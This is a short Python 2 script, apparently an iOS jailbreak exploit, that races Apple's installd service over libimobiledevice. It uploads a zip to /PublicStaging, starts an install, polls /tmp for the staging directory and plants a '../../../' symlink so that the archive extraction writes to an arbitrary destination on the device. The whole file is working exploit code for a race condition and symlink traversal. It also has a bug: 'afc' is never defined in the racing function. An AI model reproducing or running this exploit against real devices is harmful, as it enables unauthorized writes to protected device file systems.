from imobiledevice import *

def get_lockdown():
	while True:
		try:
			ld = LockdownClient(iDevice())
			return ld
		except iDeviceError:
			continue
		except LockdownError:
			continue

def get_client(service_class):
        ld = get_lockdown()
        return ld.get_service_client(service_class)

def get_afc():
	return get_client(AfcClient)

def get_ip():
	return get_client(InstallationProxyClient)

def race_installd(zip_file, destination):
	ip = get_ip()
	
	try:
		while True:
			with afc.open("/PublicStaging/" + zip_file, "w") as remote:
				with open(zip_file, "r") as local:
					remote.write(local.read())
			
			options = plist.from_xml("<plist><dict><key>CFBundleIdentifier</key><string>juniper.installd.race</string></dict></plist>")
			
			try:
				ip.install("/PublicStaging/" + zip_file, options)
			except:
				pass
			
			while True:
				try:
					tmp_contents = afc.read_directory("/tmp")
					matching_entries = [i for i in tmp_contents if i.find("install_staging.") != -1]
					
					if len(matching_entries) is 0:
						continue
					
					entry = matching_entries[0]
					
					staging_contents = afc.read_directory("/tmp/" + entry)
					
					if len(staging_contents) is 2:
						print(" - Succeeded before extraction!")
						afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
						raise StopIteration
					else:
						foo_contents = afc.read_directory("/tmp/" + entry + "/foo_extracted")
						
						if len(foo_contents) is 2:
							print(" - Succeeded during extraction!")
							afc.rename_path("/tmp/" + entry + "/foo_extracted", "/tmp/" + entry + "/foo_extracted.old")
							afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
							raise StopIteration
				except AfcError, e:
					if e.code is 10:
						raise StopIteration
					else:
						continue
	except StopIteration:
		return True
